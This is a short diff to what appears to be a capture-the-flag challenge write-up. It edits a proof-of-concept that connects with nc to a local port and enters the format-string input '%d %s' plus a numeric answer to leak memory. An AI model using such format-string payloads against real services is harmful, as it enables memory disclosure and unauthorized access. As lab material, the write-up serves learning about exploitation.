@@ -5,7 +5,7 @@ dumped once its address is known.
 ## Quick PoC
 ```
 # Replace port and ip with real ones
-nc 127.25.0.2 2025
+nc 127.0.0.1 2025
 
 # Enter "%d %s" when asked for username
 # Enter "4210848" when asked for answer
